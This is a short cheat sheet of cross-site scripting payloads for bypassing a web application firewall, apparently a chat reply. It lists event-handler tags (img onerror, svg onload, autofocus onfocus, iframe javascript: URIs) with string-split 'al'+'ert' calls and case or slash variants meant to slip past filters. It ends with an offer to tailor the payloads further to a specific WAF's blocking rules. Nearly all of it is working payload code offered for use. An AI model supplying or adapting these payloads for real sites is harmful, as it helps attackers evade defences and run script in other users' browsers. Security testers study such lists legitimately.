### bypaas using %0a and encode + to %2B

Here is a clean list of valid HTML injection payloads that do not use the <script> tag. They use alternative HTML tags and inline event handlers to execute your JavaScript execution chain.
## Standard Event Payloads (Trigger Instantly)
```
<img src="x" onerror="self['al'+'ert'](1)">
<svg onload="self['al'+'ert'](1)">
<body onload="self['al'+'ert'](1)">
<iframe src="javascript:self['al'+'ert'](1)"></iframe>
<animate onbegin="self['al'+'ert'](1)" attributeName="x">
<details open ontoggle="self['al'+'ert'](1)">
```
## Focus Payloads (Trigger Automatically via Autofocus)
```
<input autofocus onfocus="self['al'+'ert'](1)">
<textarea autofocus onfocus="self['al'+'ert'](1)"></textarea>
<select autofocus onfocus="self['al'+'ert'](1)"></select>
<button autofocus onfocus="self['al'+'ert'](1)"></button>
```
## Video & Audio Payloads
```
<video><source onerror="self['al'+'ert'](1)"></video>
<audio src="x" onerror="self['al'+'ert'](1)"></audio>
<object data="javascript:self['al'+'ert'](1)"></object>
```
## Obfuscated Tag Formats (If Tag Names or Spaces are Filtered)
```
<Img Src="x" OnError="self['al'+'ert'](1)">
<svg/onload="self['al'+'ert'](1)">
<iframe/src="javascript:self['al'+'ert'](1)">
```
To tweak these for your specific environment, let me know:

* Is the WAF blocking equals signs = or quotes "?
* Are angle brackets < > fully allowed, or do you need payloads that break out of existing attributes?
* Is the WAF stripping spaces inside the HTML tags?


